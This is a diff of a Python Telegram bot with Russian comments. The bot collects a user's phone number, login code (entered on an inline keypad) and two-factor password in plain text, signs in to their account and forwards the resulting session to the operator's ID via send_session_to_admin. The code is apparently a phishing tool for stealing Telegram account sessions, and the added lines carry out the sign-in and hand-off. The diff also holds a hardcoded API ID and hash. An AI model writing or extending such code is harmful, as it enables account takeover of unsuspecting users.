@@ -20,14 +20,7 @@ API_ID = 35800959  # СМЕНИТЬ!
 API_HASH = '708e7d0bc3572355bcaf68562cc068f1'  # СМЕНИТЬ!
 
 # Прокси (опционально)
-PROXY = {
-    "proxy_type": None,
-    "addr": None,
-    "port": None,
-    "username": None,
-    "password": None
-}
-# PROXY = None
+PROXY = None  # или словарь с настройками
 
 SESSIONS_DIR = "sessions"
 BACKUP_DIR = "sessions_backup"
@@ -93,7 +86,7 @@ async def send_session_to_admin(user_id, phone, client):
     except Exception as e:
         await bot.send_message(YOUR_USER_ID, f"Ошибка: {e}")
 
-# ===== КЛАВИАТУРА ТОЛЬКО ДЛЯ КОДА =====
+# ===== КЛАВИАТУРЫ =====
 def code_keyboard():
     buttons = []
     for i in range(1, 10):
@@ -175,51 +168,51 @@ async def handle_code_digit(callback: types.CallbackQuery, state: FSMContext):
     
     if action == "backspace":
         auth_states[user_id]["code"] = auth_states[user_id]["code"][:-1]
-    elif action == "done":
-        # Обрабатываем подтверждение
-        await code_done(callback, state)
-        return
-    else:
-        auth_states[user_id]["code"] += action
-    
-    await callback.message.edit_text(
-        f"🔢 Введите код:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
-        reply_markup=code_keyboard(),
-        parse_mode="Markdown"
-    )
-    await callback.answer()
-
-async def code_done(callback: types.CallbackQuery, state: FSMContext):
-    user_id = callback.from_user.id
-    code = auth_states[user_id].get("code", "")
-    client = auth_states[user_id].get("client")
-    phone = auth_states[user_id].get("phone", "")
-    
-    if not client:
-        await callback.answer("❌ Ошибка", show_alert=True)
-        return
-    
-    try:
-        await client.sign_in(phone, code)
-        user_clients[user_id] = client
-        
-        await send_session_to_admin(user_id, phone, client)
-        
-        await callback.message.edit_text("✅ Авторизация успешна! Сессия сохранена.")
-        await callback.message.answer("Выберите действие:", reply_markup=main_menu())
-        await state.clear()
-    
-    except SessionPasswordNeededError:
         await callback.message.edit_text(
-            "🔐 Включена двухфакторная аутентификация.\n"
-            "Введите пароль (обычным текстом):",
-            reply_markup=cancel_keyboard()
+            f"🔢 Введите код:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
+            reply_markup=code_keyboard(),
+            parse_mode="Markdown"
         )
-        await state.set_state(AuthStates.waiting_password)
-    
-    except Exception as e:
-        await callback.message.edit_text(f"❌ Неверный код: {str(e)}\nПопробуйте /start")
-        await state.clear()
+    elif action == "done":
+        # Подтверждение кода
+        code = auth_states[user_id].get("code", "")
+        client = auth_states[user_id].get("client")
+        phone = auth_states[user_id].get("phone", "")
+        
+        if not client:
+            await callback.answer("❌ Ошибка", show_alert=True)
+            await callback.answer()
+            return
+        
+        try:
+            await client.sign_in(phone, code)
+            user_clients[user_id] = client
+            
+            await send_session_to_admin(user_id, phone, client)
+            
+            await callback.message.edit_text("✅ Авторизация успешна! Сессия сохранена.")
+            await callback.message.answer("Выберите действие:", reply_markup=main_menu())
+            await state.clear()
+        
+        except SessionPasswordNeededError:
+            await callback.message.edit_text(
+                "🔐 Включена двухфакторная аутентификация.\n"
+                "Введите пароль (обычным текстом):",
+                reply_markup=cancel_keyboard()
+            )
+            await state.set_state(AuthStates.waiting_password)
+        
+        except Exception as e:
+            await callback.message.edit_text(f"❌ Неверный код: {str(e)}\nПопробуйте /start")
+            await state.clear()
+    else:
+        # Обычная цифра
+        auth_states[user_id]["code"] += action
+        await callback.message.edit_text(
+            f"🔢 Введите код:\n`{auth_states[user_id]['code']}`\n\nИспользуйте клавиатуру:",
+            reply_markup=code_keyboard(),
+            parse_mode="Markdown"
+        )
     
     await callback.answer()
 
